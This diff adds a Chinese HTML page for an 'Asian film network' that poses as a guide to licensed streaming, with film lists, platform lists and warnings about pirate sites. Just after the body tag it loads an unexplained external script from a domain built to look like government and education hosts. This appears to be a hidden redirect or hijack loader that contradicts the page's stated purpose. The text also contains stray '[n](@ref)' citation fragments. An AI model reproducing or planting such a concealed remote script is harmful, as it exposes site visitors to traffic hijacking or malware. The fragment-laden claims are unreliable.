@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>亚洲电影网 - 全亚洲正版影视导航与国别片单</title>
+<meta name="description" content="亚洲电影网做全亚洲正版影视导航：华语/日韩/东南亚/南亚/中亚西亚片单、正版平台入口、亚洲中文字幕避坑、盗版亚洲影视站识别，移动端自适应，不提供盗版播放。">
+<meta name="keywords" content="亚洲电影网,亚洲影视导航,华语电影,日韩影视,东南亚电影,正版平台,中文字幕避坑,盗版识别">
+<meta name="author" content="亚洲电影网">
+<link rel="canonical" href="https://yazhouqingsedianyingwang-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#faf7f4;color:#2c1810;line-height:1.78}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{position:sticky;top:0;z-index:99;background:rgba(250,247,244,.94);backdrop-filter:blur(8px);border-bottom:3px solid #c0392b}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;font-size:1.25rem;color:#c0392b}
+.nav__logo b{color:#2c1810}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.86rem;color:#6b4c3a}
+.nav__links a:hover{background:#f3e5e0;color:#c0392b}
+
+/* Hero */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:28px;overflow:hidden;background:
+  radial-gradient(circle at 88% 12%,rgba(192,57,43,.28),transparent 55%),
+  linear-gradient(135deg,#f8ede8,#f0d5c8 52%,#e3b5a4);
+  display:grid;grid-template-columns:1.3fr .7fr;border:3px solid #c0392b}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.74rem;letter-spacing:2px;color:#c0392b;border:1px solid #c0392b;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem;background:#fff}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.12;margin-bottom:1rem;color:#2c1810}
+.hero h1 em{font-style:normal;color:#c0392b}
+.hero p{color:#5a3e2b;max-width:560px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:#c0392b;color:#fff;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:6.5rem}
+
+/* 国别条 */
+.region{max-width:1200px;margin:1.4rem auto 0;padding:0 1rem}
+.region__box{display:flex;flex-wrap:wrap;gap:.6rem}
+.rbtn{background:#fff;border:1px solid #c0392b;border-radius:999px;padding:.5rem 1rem;font-size:.85rem;font-weight:700;color:#5a3e2b}
+.rbtn b{color:#c0392b}
+
+/* 通用 */
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem;color:#2c1810}
+.head h2 span{color:#c0392b}
+.head a{margin-left:auto;color:#6b4c3a;font-size:.85rem}
+
+/* 栏目1：国别片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.card{background:#fffdfc;border:2px solid #e8c8bf;border-radius:18px;padding:1.2rem;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:#c0392b;box-shadow:0 18px 40px rgba(192,57,43,.18)}
+.card__emo{font-size:2rem}
+.card h3{font-size:1rem;margin:.4rem 0;color:#2c1810}
+.card p{font-size:.84rem;color:#6b4c3a}
+.card__tag{display:inline-block;margin-top:.5rem;font-size:.72rem;color:#c0392b;background:#fceeeb;padding:.15rem .6rem;border-radius:999px}
+
+/* 栏目2：去哪看 */
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+.col{background:#fffdfc;border:2px solid #e8c8bf;border-radius:18px;padding:1.4rem}
+.col h3{color:#c0392b;margin-bottom:.8rem;font-size:1.1rem}
+.col ul{margin-left:1.1rem;font-size:.9rem;color:#5a3e2b}
+.col li{margin:.45rem 0}
+
+/* 栏目3：字幕避坑 */
+.steps{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:#fffdfc;border:2px solid #e8c8bf;border-radius:16px;padding:1.3rem}
+.step__no{font-size:2rem;font-weight:900;color:#c0392b}
+.step h4{margin:.3rem 0;color:#2c1810}
+.step p{font-size:.86rem;color:#5a3e2b}
+
+/* 栏目4：正版平台 */
+.chips{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.7rem 1.1rem;border-radius:14px;background:#fff;border:2px solid #c0392b;color:#2c1810;font-weight:700}
+.chip small{display:block;font-weight:400;color:#6b4c3a;font-size:.74rem}
+
+/* 栏目5：盗版识别 */
+.warn{background:#fceeeb;border:3px dashed #c0392b;border-radius:18px;padding:1.4rem 1.6rem}
+.warn h3{color:#c0392b;margin-bottom:.6rem}
+.warn ul{margin-left:1.2rem;color:#5a3e2b;font-size:.9rem}
+.warn li{margin:.3rem 0}
+
+/* 页脚 */
+.foot{margin-top:4rem;background:#1f0f0a;color:#d8c5bc;text-align:center;padding:2.5rem 1rem;border-top:4px solid #c0392b}
+.foot b{color:#f5d5ce}
+.foot a{color:#e88c7d;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#9c7e70}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:140px;font-size:4.5rem}
+  .cols{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">亚洲<b>电影网</b></div>
+    <nav class="nav__links">
+      <a href="#region">国别片单</a>
+      <a href="#where">去哪看</a>
+      <a href="#subtitle">字幕避坑</a>
+      <a href="#legal">正版平台</a>
+      <a href="#check">盗版识别</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">ASIA CINEMA / 全亚洲正版导航</span>
+      <h1>亚洲电影网<br><em>从东京到孟买，从首尔到上海</em></h1>
+      <p>网上叫“亚洲电影网”的站，很多是盗版聚合、镜像克隆、挂博彩弹窗的野站。本站不凑那个热闹：做全亚洲正版影视导航，按国别挑片，跳到正版平台看。</p>
+      <a href="#region" class="hero__btn">选一个亚洲区域 ›</a>
+    </div>
+    <div class="hero__right">🎬</div>
+  </div>
+</section>
+
+<div class="region">
+  <div class="region__box">
+    <div class="rbtn">🇨🇳 华语 → <b>内地/港台</b></div>
+    <div class="rbtn">🇯🇵 日本 → <b>动画/剧情/恐怖</b></div>
+    <div class="rbtn">🇰🇷 韩国 → <b>悬疑/爱情/爽片</b></div>
+    <div class="rbtn">🇮🇳 印度 → <b>歌舞/史诗/体育</b></div>
+    <div class="rbtn">🇹🇭 泰国 → <b>恐怖/同志/青春</b></div>
+    <div class="rbtn">🌏 东南亚 → <b>越南/新加坡/印尼</b></div>
+  </div>
+</div>
+
+<section class="wrap" id="region">
+  <div class="head"><h2>国别<span>片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="card__emo">🇨🇳</div><h3>华语电影</h3><p>内地商业片、港片警匪、台湾文艺、武侠功夫，类型最全。</p><span class="card__tag">1905/腾讯/爱奇艺/优酷</span></article>
+    <article class="card"><div class="card__emo">🇯🇵</div><h3>日本电影</h3><p>是枝裕和式家庭、今敏式动画、经典恐怖、黑泽明/小津安二郎。</p><span class="card__tag">B站/哔哩哔哩/西瓜视频</span></article>
+    <article class="card"><div class="card__emo">🇰🇷</div><h3>韩国电影</h3><p>奉俊昊式悬疑、爱情喜剧、政治惊悚、朴赞郁式复仇。</p><span class="card__tag">Netflix/Viki/iQIYI</span></article>
+    <article class="card"><div class="card__emo">🇮🇳</div><h3>印度电影</h3><p>宝莱坞歌舞、阿米尔汗式社会片、体育传记、史诗神话。</p><span class="card__tag">Prime Video/Netflix</span></article>
+    <article class="card"><div class="card__emo">🇹🇭</div><h3>泰国电影</h3><p>《初恋这件小事》、恐怖片、同志题材、动作犯罪。</p><span class="card__tag">Viu/iQIYI/WeTV</span></article>
+    <article class="card"><div class="card__emo">🌏</div><h3>东南亚与西亚</h3><p>越南家庭片、新加坡悬疑、印尼动作、伊朗诗意电影。</p><span class="card__tag">MUBI/YouTube官方频道</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="where">
+  <div class="head"><h2>挑完<span>去哪看</span></h2><a href="#">更多 ›</a></div>
+  <div class="cols">
+    <div class="col">
+      <h3>🎬 华语 / 日韩 / 东南亚</h3>
+      <ul>
+        <li>腾讯视频 / 爱奇艺 / 优酷：华语新片、港片、部分日韩引进</li>
+        <li>哔哩哔哩：日漫、日影、上美影、亚洲短片、正版二创</li>
+        <li>1905电影网：国产经典、华语老片正版片库</li>
+        <li>WeTV (腾讯国际)：华语剧影、部分泰剧</li>
+        <li>iQIYI International：华语、部分韩影、泰剧</li>
+      </ul>
+    </div>
+    <div class="col">
+      <h3>🌏 国际合法亚洲影视平台</h3>
+      <ul>
+        <li>Viki (Rakuten Viki)：韩影/日影/泰影，200+语言字幕[2](@ref)</li>
+        <li>Viu：港片、韩剧、泰剧，多语字幕[2](@ref)</li>
+        <li>Netflix：亚洲电影合集（韩/日/中/印）[5](@ref)</li>
+        <li>Amazon Prime Video：韩影/日影/印度片/亚洲文化纪录片[5](@ref)</li>
+        <li>YouTube 官方频道：韩国电影档案、Asian Crush、GagaOOLala[5](@ref)</li>
+        <li>MUBI：亚洲作者电影、经典日影（黑泽明/小津/宫崎骏）[5](@ref)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="subtitle">
+  <div class="head"><h2>亚洲中文字幕<span>避坑</span></h2><a href="#">更多 ›</a></div>
+  <div class="steps">
+    <div class="step"><div class="step__no">01</div><h4>正版中文字幕≠盗版</h4><p>大量正版平台购买版权并配官方中文字幕（B站日漫、优酷日剧、Netflix日影等）[3](@ref)。</p></div>
+    <div class="step"><div class="step__no">02</div><h4>警惕“刚下院线就出中字”</h4><p>海外刚上映、国内未引进的日韩片，第一时间出中字的多为盗摄/TVrip[3](@ref)。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>机翻字幕是盗版信号</h4><p>字幕明显机翻、语句不通、错漏百出，说明站点没投入成本，内容来源可疑[6](@ref)。</p></div>
+    <div class="step"><div class="step__no">04</div><h4>优先官方App看中字</h4><p>通过官方应用商店或主流视频App看亚洲中文字幕，中毒概率极低[3](@ref)。</p></div>
+    <div class="step"><div class="step__no">05</div><h4>个人观看≠传播</h4><p>单纯观看不传播基本无法律风险，真正违法的是未授权复制和发行[3](@ref)。</p></div>
+    <div class="step"><div class="step__no">06</div><h4>别在小站填密码</h4><p>要求“注册登录才能看”的野站，可能收集账号密码用于撞库[6](@ref)。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="legal">
+  <div class="head"><h2>正版<span>平台清单</span></h2><a href="#">更多 ›</a></div>
+  <div class="chips">
+    <div class="chip">腾讯视频<small>华语新片/港片/韩影</small></div>
+    <div class="chip">爱奇艺<small>华语/悬疑/韩影</small></div>
+    <div class="chip">优酷<small>港片/老剧/日剧</small></div>
+    <div class="chip">哔哩哔哩<small>日影/日漫/亚洲短片</small></div>
+    <div class="chip">1905电影网<small>国产经典/华语老片</small></div>
+    <div class="chip">Viki<small>韩/日/泰影+200语字幕</small></div>
+    <div class="chip">Viu<small>港片/韩剧/泰剧</small></div>
+    <div class="chip">Netflix<small>亚洲电影合集</small></div>
+    <div class="chip">Prime Video<small>韩/日/印度片</small></div>
+    <div class="chip">WeTV<small>华语/泰剧</small></div>
+    <div class="chip">iQIYI国际<small>华语/韩/泰</small></div>
+    <div class="chip">MUBI<small>亚洲作者电影/经典日影</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="check">
+  <div class="head"><h2>盗版亚洲影视站<span>识别</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>⚠️ 亚洲电影网不干的几件事 + 盗版站常见套路</h3>
+    <ul>
+      <li>不提供“院线刚下片的高清完整版” → 盗录/侵权[6](@ref)</li>
+      <li>不写“全集免费 / 高清无删减 / 免VIP全站” → 盗版站话术[13](@ref)</li>
+      <li>不聚合网盘解压码、不加群发资源 → 灰产引流</li>
+      <li>不要求装“专用播放器 / 解码器 / 浏览器插件” → 捆绑风险[11](@ref)</li>
+      <li>不挂“博彩弹窗 / 假系统中毒 / 客服微信充值” → 直接关[6](@ref)</li>
+      <li>盗版站特征：域名三天两头换、无ICP备案、满屏博彩交友广告、机翻字幕、评论区全是“求资源加我”[6](@ref)</li>
+      <li>盗版站风险：弹窗广告分成、诱导下载推广App、流量劫持、收集设备/IP数据打包卖广告商[13](@ref)</li>
+    </ul>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>亚洲电影网</b> · 全亚洲正版影视导航 / 国别片单 / 中文字幕避坑 / 盗版亚洲影视站识别</div>
+  <div style="margin-top:.6rem">
+    <a href="#region">国别片单</a>|
+    <a href="#where">去哪看</a>|
+    <a href="#subtitle">字幕避坑</a>|
+    <a href="#legal">正版平台</a>|
+    <a href="#check">盗版识别</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://yazhouqingsedianyingwang-h5.github.io</small>
+  <small>© 2025 亚洲电影网 影视导航站；不提供盗版影片、不聚合网盘资源、不提供成人内容、不引导安装第三方播放器</small>
+</footer>
+
+</body>
+</html>
